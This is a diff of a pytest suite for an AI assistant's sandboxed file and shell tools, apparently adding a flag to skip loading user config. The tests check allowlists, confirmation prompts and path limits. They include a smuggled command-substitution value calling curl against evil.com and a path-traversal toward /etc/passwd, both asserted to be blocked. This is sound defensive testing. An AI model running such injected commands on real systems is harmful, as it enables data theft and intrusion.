@@ -26,7 +26,7 @@ from ai_assist.filesystem_tools import (
 async def test_allowlisted_command_executes_directly():
     """Allowlisted commands like ls, grep run without confirmation"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": "ls /tmp"})
 
@@ -39,7 +39,7 @@ async def test_non_allowlisted_command_blocked_without_callback(tmp_path, monkey
     """Non-allowlisted commands return error when no confirmation callback is set"""
     monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
     # No confirmation_callback set
 
     result = await tools.execute_tool("execute_command", {"command": "curl http://example.com"})
@@ -52,7 +52,7 @@ async def test_non_allowlisted_command_prompts_user(tmp_path, monkeypatch):
     """Non-allowlisted commands call the confirmation callback when set"""
     monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     callback_called = False
 
@@ -73,7 +73,7 @@ async def test_user_rejects_command(tmp_path, monkeypatch):
     """When user rejects via callback, command is not executed"""
     monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     async def reject_callback(command: str) -> bool:
         return False
@@ -90,7 +90,7 @@ async def test_user_rejects_command(tmp_path, monkeypatch):
 async def test_user_approves_command():
     """When user approves via callback, command runs"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     async def approve_callback(command: str) -> bool:
         return True
@@ -106,7 +106,7 @@ async def test_user_approves_command():
 async def test_allowlist_checks_first_token():
     """Allowlist extracts command name from first token, including full paths and pipes"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     # Full path to an allowlisted command should work
     result = await tools.execute_tool("execute_command", {"command": "/usr/bin/ls /tmp"})
@@ -125,7 +125,7 @@ async def test_allowlist_checks_first_token():
 async def test_no_timeout_in_interactive_mode():
     """In interactive mode (callback set), no timeout is applied"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     async def approve_all(command: str) -> bool:
         return True
@@ -145,7 +145,7 @@ async def test_no_timeout_in_interactive_mode():
 async def test_custom_allowlist_from_config():
     """Config overrides default allowlist"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["echo", "pwd"])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     # 'echo' is in custom allowlist - should work
     result = await tools.execute_tool("execute_command", {"command": "echo hello"})
@@ -163,7 +163,7 @@ async def test_custom_allowlist_from_config():
 async def test_read_file_allowed_path(tmp_path):
     """Reading a file under an allowed path succeeds"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path)])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     test_file = tmp_path / "test.txt"
     test_file.write_text("hello world")
@@ -178,7 +178,7 @@ async def test_read_file_allowed_path(tmp_path):
 async def test_read_file_blocked_path(tmp_path):
     """Reading a file outside allowed paths returns error"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path / "allowed")])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     blocked_file = tmp_path / "blocked" / "secret.txt"
     blocked_file.parent.mkdir(parents=True, exist_ok=True)
@@ -193,7 +193,7 @@ async def test_read_file_blocked_path(tmp_path):
 async def test_create_directory_blocked_path(tmp_path):
     """Cannot create directory outside allowed paths"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path / "allowed")])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("create_directory", {"path": str(tmp_path / "blocked" / "new_dir")})
 
@@ -209,7 +209,7 @@ async def test_custom_allowed_paths_from_config(tmp_path):
     test_file.write_text("custom data")
 
     config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(custom_dir)])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("read_file", {"path": str(test_file)})
     assert "custom data" in result
@@ -222,7 +222,7 @@ async def test_path_traversal_blocked(tmp_path):
     allowed_dir.mkdir()
 
     config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(allowed_dir)])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     # Try to traverse out of allowed directory
     traversal_path = str(allowed_dir / ".." / ".." / "etc" / "passwd")
@@ -235,7 +235,7 @@ async def test_path_traversal_blocked(tmp_path):
 async def test_list_directory_blocked_path(tmp_path):
     """Cannot list directory outside allowed paths"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path / "allowed")])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     blocked_dir = tmp_path / "blocked"
     blocked_dir.mkdir()
@@ -249,7 +249,7 @@ async def test_list_directory_blocked_path(tmp_path):
 async def test_search_in_file_blocked_path(tmp_path):
     """Cannot search file outside allowed paths"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path / "allowed")])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     blocked_file = tmp_path / "blocked" / "data.txt"
     blocked_file.parent.mkdir(parents=True, exist_ok=True)
@@ -264,7 +264,7 @@ async def test_search_in_file_blocked_path(tmp_path):
 async def test_empty_allowed_paths_allows_all(tmp_path):
     """When allowed_paths is empty, all paths are accessible (backwards compat)"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     test_file = tmp_path / "anywhere.txt"
     test_file.write_text("accessible")
@@ -284,7 +284,7 @@ async def test_create_directory_prompts_confirmation(tmp_path):
         allowed_paths=[str(tmp_path)],
         confirm_tools=["internal__create_directory"],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     callback_called = False
 
@@ -310,7 +310,7 @@ async def test_configurable_confirm_tools_list(tmp_path):
         allowed_paths=[str(tmp_path)],
         confirm_tools=[],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     callback_called = False
 
@@ -333,7 +333,7 @@ async def test_configurable_confirm_tools_list(tmp_path):
 def test_add_permanent_allowed_command(tmp_path):
     """add_permanent_allowed_command persists command to JSON file"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     json_file = tmp_path / ALLOWED_COMMANDS_FILE
     with pytest.MonkeyPatch.context() as mp:
@@ -350,7 +350,7 @@ def test_add_permanent_allowed_command(tmp_path):
 def test_add_permanent_allowed_command_no_duplicate(tmp_path):
     """Adding the same command twice does not create duplicates"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     json_file = tmp_path / ALLOWED_COMMANDS_FILE
     with pytest.MonkeyPatch.context() as mp:
@@ -381,7 +381,7 @@ def test_load_user_allowed_commands(tmp_path):
 def test_load_user_allowed_commands_no_file():
     """Missing JSON file does not cause errors"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
     # Should not raise - the file simply doesn't exist
     assert len(tools.allowed_commands) > 0  # has defaults
 
@@ -395,7 +395,7 @@ def test_load_user_allowed_commands_corrupt_json(tmp_path):
         mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
 
         config = AiAssistConfig(anthropic_api_key="test")
-        tools = FilesystemTools(config)
+        tools = FilesystemTools(config, load_user_config=False)
 
     # Should still have defaults, no crash
     assert len(tools.allowed_commands) > 0
@@ -411,7 +411,7 @@ async def test_permanently_allowed_command_executes(tmp_path):
         mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
 
         config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
-        tools = FilesystemTools(config)
+        tools = FilesystemTools(config, load_user_config=False)
 
     # echo is not in the config allowlist but is in the persistent file
     result = await tools.execute_tool("execute_command", {"command": "echo persistent"})
@@ -425,7 +425,7 @@ async def test_permanently_allowed_command_executes(tmp_path):
 async def test_get_today_date():
     """get_today_date returns today's date in YYYY-MM-DD format"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("get_today_date", {})
 
@@ -437,7 +437,7 @@ async def test_get_today_date():
 async def test_get_current_time():
     """get_current_time returns current date and time in ISO format"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("get_current_time", {})
 
@@ -454,7 +454,7 @@ async def test_blocked_path_calls_path_confirmation_callback(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[str(tmp_path / "allowed")],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     blocked_file = tmp_path / "blocked" / "data.txt"
     blocked_file.parent.mkdir(parents=True, exist_ok=True)
@@ -482,7 +482,7 @@ async def test_blocked_path_user_rejects(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[str(tmp_path / "allowed")],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     blocked_file = tmp_path / "blocked" / "data.txt"
     blocked_file.parent.mkdir(parents=True, exist_ok=True)
@@ -506,7 +506,7 @@ async def test_blocked_path_no_callback_still_blocks(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[str(tmp_path / "allowed")],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     blocked_file = tmp_path / "blocked" / "data.txt"
     blocked_file.parent.mkdir(parents=True, exist_ok=True)
@@ -525,7 +525,7 @@ async def test_path_callback_works_for_search_in_file(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[str(tmp_path / "allowed")],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     blocked_file = tmp_path / "blocked" / "data.txt"
     blocked_file.parent.mkdir(parents=True, exist_ok=True)
@@ -548,7 +548,7 @@ async def test_path_callback_works_for_list_directory(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[str(tmp_path / "allowed")],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     blocked_dir = tmp_path / "blocked"
     blocked_dir.mkdir(parents=True, exist_ok=True)
@@ -570,7 +570,7 @@ async def test_path_callback_works_for_list_directory(tmp_path):
 def test_add_permanent_allowed_path(tmp_path):
     """add_permanent_allowed_path persists path to JSON file"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     new_path = str(tmp_path / "new-allowed")
 
@@ -590,7 +590,7 @@ def test_add_permanent_allowed_path(tmp_path):
 def test_add_permanent_allowed_path_no_duplicate(tmp_path):
     """Adding the same path twice does not create duplicates"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     new_path = str(tmp_path / "dup-path")
 
@@ -623,7 +623,7 @@ def test_load_user_allowed_paths(tmp_path):
 def test_load_user_allowed_paths_no_file():
     """Missing JSON file does not cause errors"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
     # Should not raise - the file simply doesn't exist
     assert len(tools.allowed_paths) > 0  # has defaults
 
@@ -636,7 +636,7 @@ def test_load_user_allowed_paths_corrupt_json(tmp_path):
     with pytest.MonkeyPatch.context() as mp:
         mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
         config = AiAssistConfig(anthropic_api_key="test")
-        tools = FilesystemTools(config)
+        tools = FilesystemTools(config, load_user_config=False)
 
     # Should still have defaults, no crash
     assert len(tools.allowed_paths) > 0
@@ -891,7 +891,7 @@ class TestExtractCommandNames:
 async def test_shell_builtins_auto_allowed():
     """Shell builtins run without prompt or allowlist"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"], allowed_paths=[])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     callback_called = False
 
@@ -911,7 +911,7 @@ async def test_shell_builtins_auto_allowed():
 async def test_echo_builtin_auto_allowed():
     """echo is a builtin and runs without prompt"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_commands=[])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": "echo hello"})
     assert "not allowed" not in result.lower()
@@ -922,7 +922,7 @@ async def test_echo_builtin_auto_allowed():
 async def test_comment_command_allowed():
     """Comment-only commands are allowed (they're no-ops)"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_commands=[])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": "# this is a comment"})
     assert "not allowed" not in result.lower()
@@ -933,7 +933,7 @@ async def test_env_var_prefix_checks_actual_command(tmp_path, monkeypatch):
     """Env var prefix is skipped, actual command is checked"""
     monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
     config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     # curl is not in allowlist — should be blocked
     result = await tools.execute_tool("execute_command", {"command": "FOO=bar curl http://example.com"})
@@ -944,7 +944,7 @@ async def test_env_var_prefix_checks_actual_command(tmp_path, monkeypatch):
 async def test_env_var_injection_detected():
     """Env vars with command substitution are NOT skipped"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     # FOO=$(curl evil.com) contains command substitution — should trigger check
     result = await tools.execute_tool("execute_command", {"command": "FOO=$(curl evil.com) ls"})
@@ -956,7 +956,7 @@ async def test_compound_command_checks_all(tmp_path, monkeypatch):
     """Compound commands check all commands, not just the first"""
     monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
     config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     # ls is allowed but curl is not
     result = await tools.execute_tool("execute_command", {"command": "ls && curl http://example.com"})
@@ -967,7 +967,7 @@ async def test_compound_command_checks_all(tmp_path, monkeypatch):
 async def test_pipe_checks_all_commands():
     """Pipe commands check all commands"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["cat"])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     # cat is allowed but unknown_cmd is not
     result = await tools.execute_tool("execute_command", {"command": "cat /dev/null | unknown_cmd"})
@@ -978,7 +978,7 @@ async def test_pipe_checks_all_commands():
 async def test_all_builtin_compound_allowed():
     """Compound commands with only builtins are auto-allowed"""
     config = AiAssistConfig(anthropic_api_key="test", allowed_commands=[], allowed_paths=[])
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": "cd /tmp && echo hello && pwd"})
     assert "not allowed" not in result.lower()
@@ -1081,7 +1081,7 @@ async def test_cd_blocked_path(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[str(allowed_dir)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": "cd /etc"})
     assert "not allowed" in result.lower() or "outside allowed" in result.lower()
@@ -1097,7 +1097,7 @@ async def test_cd_allowed_path(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[str(allowed_dir)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": f"cd {allowed_dir}"})
     assert "not allowed" not in result.lower()
@@ -1114,7 +1114,7 @@ async def test_find_blocked_path(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[str(allowed_dir)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": "find /etc -name '*.conf'"})
     assert "not allowed" in result.lower() or "outside allowed" in result.lower()
@@ -1130,7 +1130,7 @@ async def test_find_allowed_path(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[str(allowed_dir)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": f"find {allowed_dir} -name '*.txt'"})
     assert "not allowed" not in result.lower()
@@ -1148,7 +1148,7 @@ async def test_python_script_blocked_path(tmp_path):
         allowed_commands=["python3"],
         allowed_paths=[str(allowed_dir)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": "python3 /etc/script.py"})
     assert "not allowed" in result.lower() or "outside allowed" in result.lower()
@@ -1167,7 +1167,7 @@ async def test_python_script_allowed_path(tmp_path):
         allowed_commands=["python3"],
         allowed_paths=[str(allowed_dir)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": f"python3 {script}"})
     assert "not allowed" not in result.lower()
@@ -1182,7 +1182,7 @@ async def test_python_c_allowed_in_non_interactive_when_allowlisted(tmp_path):
         allowed_commands=["python3"],
         allowed_paths=[str(tmp_path)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
     # No confirmation_callback set = non-interactive
 
     result = await tools.execute_tool("execute_command", {"command": "python3 -c 'print(1)'"})
@@ -1199,7 +1199,7 @@ async def test_python_c_blocked_in_non_interactive_when_not_allowlisted(tmp_path
         allowed_commands=["gog"],
         allowed_paths=[str(tmp_path)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
     # No confirmation_callback set = non-interactive
 
     result = await tools.execute_tool("execute_command", {"command": "python3 -c 'print(1)'"})
@@ -1214,7 +1214,7 @@ async def test_python_c_prompts_in_interactive(tmp_path):
         allowed_commands=["python3"],
         allowed_paths=[str(tmp_path)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     callback_called = False
 
@@ -1237,7 +1237,7 @@ async def test_python_interactive_blocked_in_non_interactive(tmp_path):
         allowed_commands=["python3"],
         allowed_paths=[str(tmp_path)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": "python3"})
     assert "not allowed" in result.lower() or "interactive" in result.lower()
@@ -1250,7 +1250,7 @@ async def test_cd_no_path_restriction_allows_all(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": "cd /etc"})
     assert "not allowed" not in result.lower()
@@ -1264,7 +1264,7 @@ async def test_find_no_path_restriction_allows_all(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": "find /etc -maxdepth 0 -name '*.conf'"})
     assert "not allowed" not in result.lower()
@@ -1275,7 +1275,7 @@ async def test_find_no_path_restriction_allows_all(tmp_path):
 async def test_python_not_in_allowlist_skips_arg_check():
     """When python is not in allowlist and user confirms, no double-prompting for -c"""
     config = AiAssistConfig(anthropic_api_key="test")
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     confirm_count = 0
 
@@ -1301,7 +1301,7 @@ async def test_cd_path_traversal_blocked(tmp_path):
         anthropic_api_key="test",
         allowed_paths=[str(allowed_dir)],
     )
-    tools = FilesystemTools(config)
+    tools = FilesystemTools(config, load_user_config=False)
 
     result = await tools.execute_tool("execute_command", {"command": f"cd {allowed_dir}/../../etc"})
     assert "not allowed" in result.lower() or "outside allowed" in result.lower()
